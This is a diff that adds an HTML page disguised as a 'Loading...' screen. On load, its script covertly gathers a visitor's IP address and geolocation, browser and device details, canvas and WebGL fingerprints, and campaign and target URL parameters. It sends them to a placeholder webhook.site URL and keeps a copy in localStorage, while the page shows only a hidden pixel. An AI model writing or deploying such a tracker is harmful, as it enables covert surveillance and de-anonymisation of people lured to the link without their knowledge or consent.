@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        function collectData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                screenResolution: screen.width + 'x' + screen.height,
+                viewport: window.innerWidth + 'x' + window.innerHeight,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                target: getUrlParameter('target') || 'unknown',
+                campaign: getUrlParameter('id') || 'unknown',
+                visitor: getUrlParameter('visitor') || 'unknown',
+                sessionId: generateSessionId()
+            };
+            
+            getIPInfo(data);
+            return data;
+        }
+        
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+        
+        function generateSessionId() {
+            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        }
+        
+        function getIPInfo(data) {
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json'
+            ];
+            
+            Promise.allSettled(ipServices.map(url => 
+                fetch(url).then(r => r.json())
+            )).then(results => {
+                results.forEach((result, index) => {
+                    if (result.status === 'fulfilled') {
+                        data.ipService = ipServices[index];
+                        data.ipData = result.value;
+                        sendData(data);
+                        return;
+                    }
+                });
+                sendData(data);
+            });
+        }
+        
+        function sendData(data) {
+            // Replace with your webhook URL from webhook.site
+            const webhookUrl = 'https://webhook.site/REPLACE-WITH-YOUR-ID';
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(e => console.log('Webhook failed:', e));
+            
+            // Backup: store locally
+            const stored = JSON.parse(localStorage.getItem('tracking_data') || '[]');
+            stored.push(data);
+            localStorage.setItem('tracking_data', JSON.stringify(stored));
+        }
+        
+        function getFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Browser fingerprint', 2, 2);
+            
+            return {
+                canvasFingerprint: canvas.toDataURL(),
+                webglFingerprint: getWebGLFingerprint(),
+                fonts: getFonts()
+            };
+        }
+        
+        function getWebGLFingerprint() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) return 'not supported';
+            
+            const renderer = gl.getParameter(gl.RENDERER);
+            const vendor = gl.getParameter(gl.VENDOR);
+            return `${vendor} ${renderer}`;
+        }
+        
+        function getFonts() {
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Helvetica', 'Georgia'];
+            const available = [];
+            
+            testFonts.forEach(font => {
+                const span = document.createElement('span');
+                span.style.fontFamily = font;
+                span.style.fontSize = '12px';
+                span.textContent = 'Test';
+                span.style.position = 'absolute';
+                span.style.visibility = 'hidden';
+                document.body.appendChild(span);
+                
+                if (span.offsetWidth > 0) {
+                    available.push(font);
+                }
+                document.body.removeChild(span);
+            });
+            
+            return available;
+        }
+        
+        window.onload = function() {
+            setTimeout(() => {
+                const data = collectData();
+                data.fingerprint = getFingerprint();
+                console.log('Collected data:', data);
+            }, 1000);
+        };
+    </script>
+    
+    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1" height="1" style="display:none;">
+</body>
+</html>
